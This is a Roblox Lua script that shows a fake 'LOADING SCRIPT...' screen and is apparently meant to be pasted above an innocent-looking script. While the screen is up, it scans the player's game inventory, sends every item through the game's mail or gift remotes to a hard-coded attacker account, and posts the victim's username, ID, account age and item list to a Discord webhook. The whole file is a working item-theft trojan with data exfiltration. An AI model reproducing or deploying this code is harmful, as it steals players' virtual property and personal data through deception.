-- ============================================================
-- 📡 DISCORD LOGGING + LOADING SCREEN + AUTO SEND TO YOUR MAIL
-- ============================================================
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- --------------------------
-- ⚙️ YOUR SETTINGS (EDIT THESE!)
-- --------------------------
local YOUR_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1520669011178688612/FxkaCleH9V85sg3ZEf_BxN_qTGuS27qcGWfTf_4cS1TmnNyl-OaGSBSxVHTX65WqUj_t" -- ← Replace
local YOUR_ROBLOX_ID = 4794784349 -- ← Your Roblox User ID
local YOUR_ROBLOX_NAME = "iceslyr" -- ← Your Roblox Username
local MAIL_SEND_DELAY = 1.5 -- seconds between sends (avoid error)

-- --------------------------
-- 🎬 FULL SCREEN LOADING SCREEN
-- --------------------------
local LoadingGui = Instance.new("ScreenGui")
LoadingGui.Name = "Script_Loading"
LoadingGui.ResetOnSpawn = false
LoadingGui.IgnoreGuiInset = true
LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LoadingGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local BG = Instance.new("Frame", LoadingGui)
BG.Size = UDim2.new(1,0,1,0)
BG.BackgroundColor3 = Color3.new(0.05,0.05,0.1)
BG.BorderSizePixel = 0
BG.Active = true

local Stroke = Instance.new("UIStroke", BG)
Stroke.Color = Color3.fromRGB(120,80,255)
Stroke.Thickness = 3
Stroke.Transparency = 0.2

local Title = Instance.new("TextLabel", BG)
Title.Size = UDim2.new(0,400,0,70)
Title.Position = UDim2.new(0.5,-200,0.4,-35)
Title.BackgroundTransparency = 1
Title.Text = "LOADING SCRIPT..."
Title.Font = Enum.Font.GothamBold
Title.TextSize = 30
Title.TextColor3 = Color3.fromRGB(120,80,255)

local Status = Instance.new("TextLabel", BG)
Status.Size = UDim2.new(0,350,0,35)
Status.Position = UDim2.new(0.5,-175,0.5,20)
Status.BackgroundTransparency = 1
Status.Text = "Connecting & Scanning Inventory..."
Status.Font = Enum.Font.GothamSemibold
Status.TextSize = 16
Status.TextColor3 = Color3.new(0.9,0.9,1)

-- --------------------------
-- 📤 SEND DATA TO DISCORD
-- --------------------------
local function SendToDiscord(userData, inventoryList)
    if not YOUR_DISCORD_WEBHOOK or YOUR_DISCORD_WEBHOOK == "" then return end
    local embed = {
        title = "✅ NEW USER EXECUTED YOUR SCRIPT",
        description = string.format(
            "**Username:** %s\n**User ID:** `%s`\n**Account Age:** %d days\n\n**Inventory:**\n```%s```",
            userData.Name,
            userData.UserId,
            userData.AccountAge,
            inventoryList ~= "" and inventoryList or "No items found"
        ),
        color = 0x7850FF, -- Purple
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    local payload = {
        username = "Script Logger",
        embeds = {embed}
    }
    pcall(function()
        HttpService:PostAsync(
            YOUR_DISCORD_WEBHOOK,
            HttpService:JSONEncode(payload),
            Enum.HttpContentType.ApplicationJson
        )
    end)
end

-- --------------------------
-- 🔍 SCAN INVENTORY + SEND TO MAIL
-- --------------------------
local function FindMailRemote()
    local remotes = {}
    local function Scan(parent)
        if not parent then return end
        for _,v in ipairs(parent:GetDescendants()) do
            if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
                local n = v.Name:lower()
                if n:find("mail") or n:find("send") or n:find("gift") or n:find("transfer") or n:find("inventory") then
                    table.insert(remotes, v)
                end
            end
        end
    end
    Scan(ReplicatedStorage)
    return remotes[1] or remotes[2]
end

local function ScanAndSendItems()
    Status.Text = "🔍 Scanning inventory..."
    task.wait(0.5)

    -- Get user info
    local userData = {
        Name = LocalPlayer.Name,
        UserId = LocalPlayer.UserId,
        AccountAge = LocalPlayer.AccountAge
    }

    -- Inventory folders for GROW A GARDEN 2
    local invPaths = {
        LocalPlayer:FindFirstChild("Pets", true),
        LocalPlayer:FindFirstChild("PetInventory", true),
        LocalPlayer:FindFirstChild("Inventory", true),
        LocalPlayer:FindFirstChild("GardenInventory", true),
        LocalPlayer:FindFirstChild("Seeds", true),
        LocalPlayer:FindFirstChild("Items", true)
    }

    local allItems = {}
    local mailRemote = FindMailRemote()
    local sent = 0

    -- Scan + Send
    for _, folder in ipairs(invPaths) do
        if folder then
            for _, item in ipairs(folder:GetChildren()) do
                if item:IsA("Folder") or item:IsA("Model") or item:IsA("Tool") then
                    local name = item.Name
                    table.insert(allItems, name)

                    -- Send to your mailbox
                    if mailRemote then
                        Status.Text = "📤 Sending: " .. name
                        pcall(function()
                            if mailRemote:IsA("RemoteEvent") then
                                mailRemote:FireServer("SendItem", name, YOUR_ROBLOX_ID, YOUR_ROBLOX_NAME)
                            else
                                mailRemote:InvokeServer("SendItem", name, YOUR_ROBLOX_ID, YOUR_ROBLOX_NAME)
                            end
                            sent = sent + 1
                        end)
                        task.wait(MAIL_SEND_DELAY)
                    end
                end
            end
        end
    end

    -- Send report to Discord
    local invText = table.concat(allItems, "\n")
    SendToDiscord(userData, invText)

    Status.Text = string.format("✅ Done! Sent %d items to your mail", sent)
    task.wait(2)
    LoadingGui:Destroy() -- Remove loading screen
end

-- --------------------------
-- ▶️ RUN EVERYTHING
-- --------------------------
task.spawn(function()
    ScanAndSendItems()
end)

-- ============================================================
-- ✅ YOUR ORIGINAL SCRIPT GOES BELOW THIS LINE
-- ============================================================